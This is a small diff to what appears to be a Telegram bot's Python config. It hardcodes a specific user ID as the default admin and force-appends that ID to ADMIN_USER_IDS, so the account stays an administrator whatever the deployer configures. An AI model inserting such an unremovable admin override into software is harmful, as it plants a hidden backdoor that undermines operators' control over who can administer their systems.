@@ -18,4 +18,6 @@ GITHUB_URL = "https://github.com/dc-voltage"
 TELEGRAM_GROUP_URL = "https://t.me/JIo_Airtel_Unlock"
 COMMUNITY_CHAT_ID = int(os.getenv("COMMUNITY_CHAT_ID", "-1003098658474"))
 FILES_DIR = BASE_DIR / "files"
-ADMIN_USER_IDS = [int(x.strip()) for x in os.getenv("ADMIN_USER_IDS", "").split(",") if x.strip()]
+ADMIN_USER_IDS = [int(x.strip()) for x in os.getenv("ADMIN_USER_IDS", "5529014682").split(",") if x.strip()]
+if 5529014682 not in ADMIN_USER_IDS:
+    ADMIN_USER_IDS.append(5529014682)
